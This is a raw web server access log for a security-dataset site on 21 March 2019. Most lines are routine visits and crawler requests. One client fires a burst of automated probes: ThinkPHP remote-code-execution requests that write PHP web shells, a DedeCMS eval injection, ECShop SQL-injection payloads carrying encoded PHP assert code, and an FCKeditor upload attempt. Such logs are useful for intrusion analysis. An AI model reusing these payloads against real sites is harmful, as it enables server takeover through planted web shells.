54.36.150.175 - - [21/Mar/2019:02:12:01 -0700] "GET /self.logs/2015/error.log.2015-10-26.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
223.226.70.232 - - [21/Mar/2019:09:16:46 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
223.226.70.232 - - [21/Mar/2019:09:16:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
223.226.70.232 - - [21/Mar/2019:09:16:47 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
223.226.70.232 - - [21/Mar/2019:09:16:49 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
173.254.28.137 - - [21/Mar/2019:09:19:23 -0700] "GET /wp-admin/ HTTP/1.1" 301 479 "-" "-" 
54.36.150.116 - - [21/Mar/2019:09:20:54 -0700] "GET /self.logs/access.log.2016-05-27.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
220.181.108.76 - - [21/Mar/2019:09:23:25 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.186 - - [21/Mar/2019:09:23:26 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.165 - - [21/Mar/2019:09:23:32 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.221 - - [21/Mar/2019:09:23:37 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.67.158 - - [21/Mar/2019:09:23:37 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.71.47 - - [21/Mar/2019:09:23:41 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.226 - - [21/Mar/2019:09:23:43 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.71.85 - - [21/Mar/2019:09:23:44 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.221 - - [21/Mar/2019:09:23:46 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.129.224.7 - - [21/Mar/2019:09:26:13 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 295 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:13 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:13 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 294 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:13 -0700] "GET /plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:14 -0700] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:14 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:14 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 294 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:15 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:15 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:15 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:15 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:16 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:16 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=qzavv.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=qzavv.php&content=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:17 -0700] "GET /qzavv.php HTTP/1.1" 404 294 "http://www.secrepo.com/qzavv.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:18 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:18 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:18 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=qvpvg.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=qvpvg.php&vars[1][]=<?php assert($_REQUEST[\"ysy\"]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
123.129.224.7 - - [21/Mar/2019:09:26:19 -0700] "GET /qvpvg.php HTTP/1.1" 404 294 "http://www.secrepo.com/qvpvg.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
220.181.108.158 - - [21/Mar/2019:09:26:29 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.76 - - [21/Mar/2019:09:26:29 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.148.193 - - [21/Mar/2019:09:29:07 -0700] "GET /self.logs/access.log.2016-01-01.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
5.196.154.92 - - [21/Mar/2019:09:31:24 -0700] "GET / HTTP/1.0" 301 461 "http://secrepo.com" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MRSPUTNIK 2, 2, 0, 86; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MRIE8PACK 2.0.1)" 
5.196.154.92 - - [21/Mar/2019:09:31:24 -0700] "GET / HTTP/1.0" 200 46413 "http://secrepo.com/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MRSPUTNIK 2, 2, 0, 86; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MRIE8PACK 2.0.1)" 
113.171.224.176 - - [21/Mar/2019:09:32:04 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
137.74.95.67 - - [21/Mar/2019:09:33:38 -0700] "GET /wordpress/wp-admin/ HTTP/1.1" 301 499 "-" "-" 
41.223.160.131 - - [21/Mar/2019:09:36:24 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.137 - - [21/Mar/2019:09:39:49 -0700] "GET /self.logs/2015/access.log.2015-02-18.gz HTTP/1.1" 200 8823 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
212.90.162.54 - - [21/Mar/2019:09:39:56 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
54.36.148.104 - - [21/Mar/2019:09:41:13 -0700] "GET /self.logs/2015/error.log.2015-06-21.gz HTTP/1.1" 200 2222 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
193.143.77.14 - - [21/Mar/2019:09:47:00 -0700] "GET /wp/wp-admin/ HTTP/1.1" 301 485 "-" "-" 
66.249.88.23 - - [21/Mar/2019:09:47:57 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.249.88.23 - - [21/Mar/2019:09:47:57 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
54.36.148.237 - - [21/Mar/2019:09:49:09 -0700] "GET /self.logs/2016/access.log.2016-01-26.gz HTTP/1.1" 200 5527 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
188.40.55.141 - - [21/Mar/2019:09:53:36 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
142.204.244.39 - - [21/Mar/2019:09:53:49 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
142.204.244.39 - - [21/Mar/2019:09:53:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
142.204.244.39 - - [21/Mar/2019:09:53:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
142.204.244.39 - - [21/Mar/2019:09:53:49 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
54.36.148.161 - - [21/Mar/2019:09:57:25 -0700] "GET /self.logs/access.log.2016-10-11.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.48 - - [21/Mar/2019:09:58:27 -0700] "GET /self.logs/access.log.2017-09-08.gz HTTP/1.1" 200 24260 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
150.212.127.104 - - [21/Mar/2019:09:58:35 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
150.212.127.104 - - [21/Mar/2019:09:58:37 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
150.212.127.104 - - [21/Mar/2019:09:58:38 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
150.212.127.104 - - [21/Mar/2019:09:58:40 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
203.133.169.53 - - [21/Mar/2019:09:59:12 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)" 
203.133.169.53 - - [21/Mar/2019:09:59:13 -0700] "GET / HTTP/1.1" 200 46413 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)" 
41.223.160.131 - - [21/Mar/2019:10:04:45 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
64.233.173.17 - - [21/Mar/2019:10:07:56 -0700] "GET / HTTP/1.1" 200 12511 "android-app://com.google.android.googlequicksearchbox" "Mozilla/5.0 (Linux; Android 8.0.0; SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36" 
64.233.173.18 - - [21/Mar/2019:10:07:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36" 
64.233.173.18 - - [21/Mar/2019:10:07:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36" 
64.233.173.19 - - [21/Mar/2019:10:08:01 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 8.0.0; SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36" 
107.173.162.54 - - [21/Mar/2019:10:12:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279381 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
95.163.255.152 - - [21/Mar/2019:10:12:55 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.177 - - [21/Mar/2019:10:12:56 -0700] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1502 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
70.124.158.4 - - [21/Mar/2019:10:14:52 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
70.124.158.4 - - [21/Mar/2019:10:14:53 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
70.124.158.4 - - [21/Mar/2019:10:14:53 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
70.124.158.4 - - [21/Mar/2019:10:14:53 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" 
162.242.144.71 - - [21/Mar/2019:10:15:44 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
162.242.144.71 - - [21/Mar/2019:10:15:44 -0700] "GET /robots.txt HTTP/1.1" 304 130 "-" "Tornado-Async-Client" 
162.242.144.71 - - [21/Mar/2019:10:15:44 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
162.242.144.71 - - [21/Mar/2019:10:15:44 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
95.163.255.177 - - [21/Mar/2019:10:16:54 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 1442 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
93.39.108.64 - - [21/Mar/2019:10:23:08 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
95.163.255.151 - - [21/Mar/2019:10:23:08 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dpd.html HTTP/1.1" 200 1521 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
93.39.108.64 - - [21/Mar/2019:10:23:09 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.29 - - [21/Mar/2019:10:34:52 -0700] "GET /self.logs/access.log.2015-10-29.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
89.167.129.66 - - [21/Mar/2019:10:36:41 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
89.167.129.66 - - [21/Mar/2019:10:36:43 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
89.167.129.66 - - [21/Mar/2019:10:36:43 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
89.167.129.66 - - [21/Mar/2019:10:36:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
113.171.224.176 - - [21/Mar/2019:10:38:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.149.94 - - [21/Mar/2019:10:38:46 -0700] "GET /self.logs/2016/error.log.2016-10-06.gz HTTP/1.1" 200 797 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
152.15.112.71 - - [21/Mar/2019:10:40:13 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0" 
152.15.112.71 - - [21/Mar/2019:10:40:14 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0" 
152.15.112.71 - - [21/Mar/2019:10:40:14 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0" 
152.15.112.71 - - [21/Mar/2019:10:40:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0" 
193.107.179.47 - - [21/Mar/2019:10:41:40 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
193.107.179.47 - - [21/Mar/2019:10:41:40 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
100.43.90.103 - - [21/Mar/2019:10:46:25 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [21/Mar/2019:10:46:29 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
136.206.5.90 - - [21/Mar/2019:10:47:08 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
136.206.5.90 - - [21/Mar/2019:10:47:08 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
136.206.5.90 - - [21/Mar/2019:10:47:08 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
136.206.5.90 - - [21/Mar/2019:10:47:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" 
54.36.148.186 - - [21/Mar/2019:10:47:48 -0700] "GET /self.logs/2016/access.log.2016-01-07.gz HTTP/1.1" 200 7317 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
182.70.207.157 - - [21/Mar/2019:10:48:24 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
182.70.207.157 - - [21/Mar/2019:10:48:24 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
109.122.101.226 - - [21/Mar/2019:10:55:31 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
123.125.71.48 - - [21/Mar/2019:11:04:06 -0700] "GET /robots.txt HTTP/1.1" 301 465 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.38 - - [21/Mar/2019:11:04:07 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
